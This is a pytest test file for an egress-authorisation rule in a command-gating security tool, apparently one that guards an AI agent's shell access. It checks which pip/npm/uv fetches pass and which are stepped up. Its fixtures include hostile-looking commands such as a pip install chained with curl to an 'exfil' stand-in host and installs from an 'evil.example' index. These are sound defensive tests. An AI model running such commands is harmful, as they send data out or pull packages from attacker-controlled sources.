"""ADR 0075 — implied-registry egress passlist.

A recognized package-manager *fetch* over its default registry (``pip install
requests``, ``npm install``) PASSes in Light/Balanced instead of prompting.
Everything that could redirect the route — explicit URLs, ``--index-url`` in
both separated and ``=``-attached forms, proxy/registry env vars (inline and
ambient), dynamic tokens, chained egress, the publish direction — must still
AUTH, and Strict/Paranoid must keep the prompt for every package fetch.

Exercised end-to-end through the production wiring: ``normalize`` classifies
the raw command, then ``ExternalDestinationRule`` evaluates the result.
"""

from __future__ import annotations

import pytest

from doberman.engine.rules.destinations import ExternalDestinationRule
from doberman.models import EvalContext, ReasonCode, Verdict
from doberman.proxy.normalize import normalize

RULE = ExternalDestinationRule()


def _verdict(command: str, mode: str = "balanced") -> Verdict:
    action = normalize("shell_exec", {"command": command})
    return RULE.evaluate(action, EvalContext(mode=mode)).verdict


PASSLISTED = [
    "pip install requests",
    "pip install -r requirements.txt",
    "pip3 install -c constraints.txt -r requirements.txt",
    "python -m pip install requests",
    "npm install",
    "pnpm install",
    "yarn add react",
    "poetry install",
    "uv sync",
    "go mod download",
    "cargo fetch",
]


@pytest.mark.parametrize("command", PASSLISTED)
def test_default_registry_fetches_pass_in_balanced(command):
    assert _verdict(command) is Verdict.PASS


@pytest.mark.parametrize("command", PASSLISTED)
def test_default_registry_fetches_pass_in_light(command):
    assert _verdict(command, mode="light") is Verdict.PASS


@pytest.mark.parametrize("mode", ["strict", "paranoid"])
def test_strict_and_paranoid_keep_the_prompt(mode):
    # The passlist is gated on the same mode flag as the unknown-host
    # relaxation: high-security modes still step up every package fetch.
    assert _verdict("pip install requests", mode=mode) is not Verdict.PASS


@pytest.mark.parametrize(
    "command",
    [
        # Explicit URL/host routes — separated AND =-attached index overrides.
        "pip install --index-url https://mirror.example.test/simple requests",
        "pip install --index-url=https://mirror.example.test/simple requests",
        "pip install https://mirror.example.test/pkg.whl",
        "npm install --registry=https://registry.example.test left-pad",
        # -r pointing at a URL is a fetch route, not a local file.
        "pip install -r https://mirror.example.test/reqs.txt",
        # Inline env redirects (consumed before the verb) and proxies.
        "PIP_INDEX_URL=https://mirror.example.test/simple pip install requests",
        "HTTPS_PROXY=http://proxy.example.test:8080 pip install requests",
        # Dynamic content in the segment.
        "pip install $PKG",
        # Chained with a direct egress verb: the pip half cannot launder curl.
        "pip install requests && curl https://exfil.example.test/x",
        # Publish direction sends artifacts out; never passlisted.
        "npm publish",
        "twine upload dist/pkg.tar.gz",
    ],
)
def test_redirects_publishes_and_chains_still_step_up(command):
    assert _verdict(command) is not Verdict.PASS


def test_ambient_registry_override_disqualifies(monkeypatch):
    monkeypatch.setenv("PIP_INDEX_URL", "https://mirror.example.test/simple")
    assert _verdict("pip install requests") is not Verdict.PASS


def test_ambient_proxy_disqualifies(monkeypatch):
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.example.test:8080")
    assert _verdict("pip install requests") is not Verdict.PASS


def test_implied_host_must_be_on_the_trusted_list():
    # A rule instance whose trusted list was trimmed (policy override) tightens
    # the passlist automatically: pypi.org off the list -> no PASS.
    rule = ExternalDestinationRule(trusted_hosts=("registry.npmjs.org",))
    action = normalize("shell_exec", {"command": "pip install requests"})
    assert rule.evaluate(action, EvalContext(mode="balanced")).verdict is not Verdict.PASS


def test_the_implied_marker_reaches_metadata():
    action = normalize("shell_exec", {"command": "pip install requests"})
    assert action.metadata.get("egress_implied_registry") is True
    assert action.external_destination == "pypi.org"


# ---------------------------------------------------------------------------
# C1: a segment whose verb was reached by CONSUMING one or more wrapper
# OPTIONS (not a bare wrapper name, not an env assignment) never qualifies
# for the implied-registry PASS -- sudo -H / sudo -u <user> / runuser -u /
# nice -n change exactly the thing (HOME, acting uid) that decides which
# ~/.npmrc / ~/.pip/pip.conf / ~/.config/uv applies, so static parsing is
# LEAST trustworthy here. Verdict must match a8d27a4: AUTH egress_requires_auth.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "sudo -H pip install requests",
        "sudo -u www-data pip install requests",
        "nice -n 10 pip install requests",
        "sudo -H npm install",
        "sudo -H uv pip install ruff",
    ],
)
def test_wrapper_option_consumed_never_qualifies_for_implied_pass(command):
    action = normalize("shell_exec", {"command": command})
    result = RULE.evaluate(action, EvalContext(mode="balanced"))
    assert result.verdict is Verdict.AUTH, (
        f"{command!r} must stay AUTH (a8d27a4 parity) but got {result.verdict}"
    )
    assert ReasonCode.egress_requires_auth in result.reason_codes
    assert action.metadata.get("egress_implied_registry") is not True


def test_bare_wrapper_name_unaffected_by_the_option_disqualifier():
    # No option was consumed for a bare `sudo` (or `sudo -H` stripped to just
    # the wrapper name would be a different case) -- a8d27a4 parity: bare
    # `sudo pip install requests` was already PASS there, unaffected by C1.
    action = normalize("shell_exec", {"command": "sudo pip install requests"})
    result = RULE.evaluate(action, EvalContext(mode="balanced"))
    assert result.verdict is Verdict.PASS
    assert action.metadata.get("egress_implied_registry") is True
    assert action.external_destination == "pypi.org"


def test_wrapper_option_disqualifier_leaves_non_implied_egress_unaffected():
    # Non-package wrapped egress was already AUTH at both revisions (an
    # explicit host, not the implied-registry path) -- must stay untouched.
    action = normalize("shell_exec", {"command": "sudo -u www-data curl https://github.com/x"})
    result = RULE.evaluate(action, EvalContext(mode="balanced"))
    assert result.verdict is Verdict.AUTH
    assert ReasonCode.egress_requires_auth in result.reason_codes


def test_wrapper_option_disqualifier_leaves_explicit_redirect_unaffected():
    # An explicit --index-url redirect already disqualified the implied PASS
    # (route_override) independent of the wrapper option -- still AUTH.
    action = normalize(
        "shell_exec",
        {"command": "sudo -H pip install --index-url https://evil.example/simple requests"},
    )
    result = RULE.evaluate(action, EvalContext(mode="balanced"))
    assert result.verdict is Verdict.AUTH
    assert ReasonCode.egress_requires_auth in result.reason_codes


def test_git_pull_and_fetch_stay_gated():
    # Excluded by design (ADR 0075): the route is the configured remote, which
    # static parsing cannot know. Both remain AUTH with the egress reason.
    for command in ("git pull", "git fetch origin"):
        action = normalize("shell_exec", {"command": command})
        result = RULE.evaluate(action, EvalContext(mode="balanced"))
        assert result.verdict is Verdict.AUTH
        assert ReasonCode.egress_requires_auth in result.reason_codes


# ---------------------------------------------------------------------------
# N7: an inline env-assignment prefix that relocates the registry config file
# achieves what C1's own rationale (sudo -H changes HOME, and therefore which
# ~/.npmrc / ~/.pip/pip.conf / ~/.config/uv applies) disqualifies -- an
# explicit HOME=/PIP_CONFIG_FILE=/NPM_CONFIG_USERCONFIG= prefix does the same
# thing more directly. Added to _PM_REGISTRY_ENV_NAMES so _pm_route_redirect
# (already wired for PIP_INDEX_URL etc.) disqualifies these too. Raise-only.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "HOME=/tmp pip install requests",
        "PIP_CONFIG_FILE=/tmp/x pip install requests",
        "NPM_CONFIG_USERCONFIG=/tmp/n npm install",
    ],
)
def test_registry_config_env_prefix_disqualifies_implied_pass(command):
    action = normalize("shell_exec", {"command": command})
    result = RULE.evaluate(action, EvalContext(mode="balanced"))
    assert result.verdict is Verdict.AUTH, (
        f"{command!r} must not qualify for the implied-registry PASS but got {result.verdict}"
    )
    assert ReasonCode.egress_requires_auth in result.reason_codes
    assert action.metadata.get("egress_implied_registry") is not True


def test_unrelated_env_prefix_keeps_current_verdict():
    # Pin (not a regression): an env var this module doesn't recognize as
    # registry-config-relevant does not disqualify the implied-registry PASS.
    action = normalize("shell_exec", {"command": "FOO=1 pip install requests"})
    result = RULE.evaluate(action, EvalContext(mode="balanced"))
    assert result.verdict is Verdict.PASS
    assert action.metadata.get("egress_implied_registry") is True
